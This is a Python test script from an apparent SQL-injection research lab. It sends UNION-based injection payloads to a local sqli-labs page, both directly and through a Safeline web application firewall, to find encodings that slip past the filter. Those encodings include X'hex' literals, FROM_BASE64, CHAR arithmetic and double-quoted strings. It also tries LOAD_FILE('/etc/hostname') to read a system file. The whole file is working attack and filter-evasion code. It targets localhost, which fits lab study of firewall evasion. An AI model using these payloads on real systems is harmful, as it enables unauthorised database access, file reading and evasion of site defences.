"""
bypass_lab/test_encoding2.py
=============================
Safeline blocks: CHAR(), 0x literals, function calls.
Safeline allows: numeric literals (1,2,3).

Test alternative string encodings:
  - X'hex' notation (different from 0x)
  - FROM_BASE64()
  - ELT() with base36/other tricks
  - Nested REPLACE() on known values
  - What does user's original payload actually return?

Run:
    python3 -m bypass_lab.test_encoding2
"""
import sys, time, base64
sys.path.insert(0, '/mnt/d/Kuliah/RL/SeqSQLi')
from seqsqli.core.response import classify_response
import requests

PLAIN = "http://localhost:8081/Less-1/"
WAF   = "http://localhost:8888/Less-1/"
FOUND = []

# Precompute
START = 'SEQSQLI_START'
END   = 'SEQSQLI_END'
B64_START = base64.b64encode(START.encode()).decode()   # U0VRU1FMSV9TVEFSVAE=... let me calc
B64_END   = base64.b64encode(END.encode()).decode()
HEX_START = START.encode().hex()   # 534551534c495f5354415254
HEX_END   = END.encode().hex()

print(f"START b64: {B64_START}")
print(f"END   b64: {B64_END}")
print(f"START hex: {HEX_START}")
print(f"END   hex: {HEX_END}")


def t(label, payload, url=WAF, check_plain=True):
    if check_plain:
        rp = requests.get(PLAIN, params={"id": payload}, timeout=8)
        plain_ok = classify_response(rp.text, rp.status_code, "union",
                                     strict_markers=True) == "SUCCESS"
        plain_has = START in rp.text
        plain_err = "syntax" in rp.text.lower() or "error" in rp.text.lower()
        p_tag = "OK" if plain_ok else ("HAS" if plain_has else ("ERR" if plain_err else "NO"))
    else:
        p_tag = "skip"

    rw = requests.get(WAF, params={"id": payload}, timeout=8)
    waf_ok   = classify_response(rw.text, rw.status_code, "union",
                                 strict_markers=True) == "SUCCESS"
    waf_pass = rw.status_code != 403
    w_tag = "*** BYPASS ***" if waf_ok else ("PASS" if waf_pass else "BLOCK")

    print(f"  plain={p_tag:<6} waf={w_tag:<16} | {label}")
    if waf_ok:
        FOUND.append(("BYPASS", label, payload))
        print(f"    {payload[:100]}")
    elif waf_pass:
        if check_plain:
            FOUND.append(("PASS", label, f"plain={p_tag} {payload}"))
    time.sleep(0.3)


print("\n" + "=" * 65)
print(" Encoding bypass alternatives")
print("=" * 65)

BASE = ".1-- -'/0 UNION ALL SELECT"

# ── 0. Cek apa yang user's payload kembalikan ─────────────────────────
print("\n[0] Analisis user's original payload")
rp = requests.get(PLAIN, params={"id": ".1-- -'/0 UNION ALL SELECT 1,2,3'"}, timeout=8)
print(f"  Status: {rp.status_code}")
# Find Your Login name
idx = rp.text.find("Your Login")
if idx >= 0:
    print(f"  Response: {rp.text[idx:idx+80]}")
else:
    print("  No 'Your Login' in response")
    idx2 = rp.text.find("Your")
    if idx2 >= 0:
        print(f"  Found 'Your' at: {rp.text[idx2:idx2+80]}")

# ── 1. X'hex' string literal notation ────────────────────────────────
print("\n[1] X'hex' MySQL string literal (alternative to 0x)")
t(f"X'{HEX_START}'",
  f"{BASE} 1,X'{HEX_START}',X'{HEX_END}'-- -")
t(f"X'{HEX_START}' quote end",
  f"{BASE} 1,X'{HEX_START}',X'{HEX_END}''")

# ── 2. FROM_BASE64 ────────────────────────────────────────────────────
print("\n[2] FROM_BASE64() — less common, might not be in training")
t(f"FROM_BASE64 START",
  f"{BASE} 1,FROM_BASE64('{B64_START}'),FROM_BASE64('{B64_END}')-- -")

# ── 3. N'string' (Unicode string literal MySQL) ───────────────────────
print("\n[3] N'string' Unicode literal")
t(f"N'SEQSQLI_START'",
  f"{BASE} 1,N'{START}',N'{END}'-- -")

# ── 4. Encode via REPLACE on @@version etc ───────────────────────────
print("\n[4] REPLACE() on known system strings")
# @@version starts with "5." — can we build from known values?
# Too complex, but try some creative ones:
t("REPLACE @@version to build string",
  f"{BASE} 1,REPLACE(@@version,'.','{START}'),'{END}'-- -")

# ── 5. CONCAT of individual ASCII chars via arithmetic ───────────────
print("\n[5] ELT/MAKE_SET with arithmetic args")
# S=83=80+3, E=69=70-1, Q=81, etc. — build via arithmetic in CHAR?
# But CHAR is blocked... what about pure arithmetic?
t("arithmetic CHAR",
  f"{BASE} 1,CHAR(80+3,70-1,81,83,81,76,73,95,83,84,65,82,84),CHAR(83,69,81,83,81,76,73,95,69,78,68)-- -")

# ── 6. IF() to return known strings based on true conditions ─────────
print("\n[6] IF with string literals (quote issue...)")
# Can't use quotes. But what about double-quote in ansi mode?
t('IF with double quote',
  f'{BASE} 1,IF(1=1,"SEQSQLI_START","x"),IF(1=1,"SEQSQLI_END","x")-- -')

# ── 7. Find a MySQL function that returns a predictable long string ───
print("\n[7] Functions that return detectable strings")
for fn in ["UUID()", "@@hostname", "@@version", "@@global.time_zone",
           "LOAD_FILE('/etc/hostname')"]:
    t(f"col2={fn}",
      f"{BASE} 1,{fn},2-- -")

# ── 8. Test if JUST database() (without markers) passes ──────────────
print("\n[8] database() saja, no markers (cek apakah 'security' muncul)")
t("database(),1,2",
  f"{BASE} database(),1,2-- -")

# ── Summary ───────────────────────────────────────────────────────────
print("\n" + "=" * 65)
bypasses = [x for x in FOUND if x[0] == "BYPASS"]
passes   = [x for x in FOUND if x[0] == "PASS"]
print(f" BYPASS: {len(bypasses)}  |  WAF PASS: {len(passes)}")
for tag, label, p in FOUND:
    print(f"\n  [{tag}] {label}")
    if tag == "BYPASS":
        print(f"  {p[:110]}")
